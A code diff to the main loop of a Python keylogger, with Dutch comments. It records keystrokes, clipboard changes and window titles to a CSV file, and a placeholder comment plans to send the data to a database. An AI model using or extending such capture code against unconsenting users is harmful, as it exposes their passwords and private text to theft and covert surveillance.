@@ -10,20 +10,15 @@ import window_info_logger as wilogger
 import keystrokes_and_clipboard_logger as kclogger
 import os
 import socket
-from datetime import datetime
-import time
+from datetime import datetime, timedelta
 import csv
 
 
 def check_if_time_passed(old_time, time_passed):
-    if time.time() - old_time >= time_passed:
+    current_time = datetime.now()
+    time_delta = current_time - old_time
+    if time_delta >= timedelta(seconds=time_passed):
         return True
-
-
-def log_time(csv_file, time_since_epoch):
-    current_time = datetime.fromtimestamp(time_since_epoch)
-    current_time_hour_minute_seconds = current_time.strftime('%H:%M:%S')
-    csv_file.writerow([f"\n[TIME]: {current_time_hour_minute_seconds} "])
 
 
 def initialise_log_file(csv_file):
@@ -34,7 +29,7 @@ def initialise_log_file(csv_file):
 
     # Vaststellen kolommen
     # vóór versturen naar DB moet device_nam
-    csv_file.writerow(["datetime", "application_title", "window_title", "data_ID", "logged_data"])
+    csv_file.writerow(["datetime", "window_title", "data_ID", "logged_data"])
 
 
 # Main code here
@@ -42,8 +37,8 @@ def main():
     if os.path.isfile("logged_data.csv"):
         # Add code for sending data to database here.
         os.remove("logged_data.csv")
-    old_time = time.time()
-    note_interval_seconds = 2
+    old_date_and_time = datetime.now()
+    note_interval_seconds = 60
 
     with open('logged_data.csv', 'a+', newline='') as f:
         csvreader = csv.writer(f)
@@ -51,13 +46,23 @@ def main():
         kc_logger_object = kclogger.KeysClipboardLogger(csvreader)  # Start keylogger.
         window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
         while True:
-            # Als minuut voorbij gegaan of van scherm gewisseld: haal data op
-            if check_if_time_passed(old_time, note_interval_seconds) or window_logger_object.screen_changed():
-                old_time = time.time()
-                log_time(csvreader, old_time)
+            # if window change or time has passed
+            if window_logger_object.screen_changed() or check_if_time_passed(old_date_and_time, note_interval_seconds):
+                logged_data = kc_logger_object.get_current_logged_keys()
+                window_title = window_logger_object.log_window()
+                data_id = 0
+                # save currently logged data to csv with old time + old app & window data + data ID = 0
+                csvreader.writerow(
+                    [f"{old_date_and_time}", f"{window_title}", f"{data_id}", f"{logged_data}"])
+                old_date_and_time = datetime.now()  # Yes, this is only supposed to happen if window changed or minute passed.
 
-            window_logger_object.log_window()
-            # kc_logger_object.log_clipboard()
+            # if clipboard changed
+            if kc_logger_object.clipboard_changed():
+                clipboard_date_and_time, logged_data = kc_logger_object.log_clipboard()
+                window_title = window_logger_object.log_window()
+                data_id = 1
+                csvreader.writerow(
+                    [f"{clipboard_date_and_time}", f"{window_title}", f"{data_id}", f"{logged_data}"])
 
 
 if __name__ == '__main__':
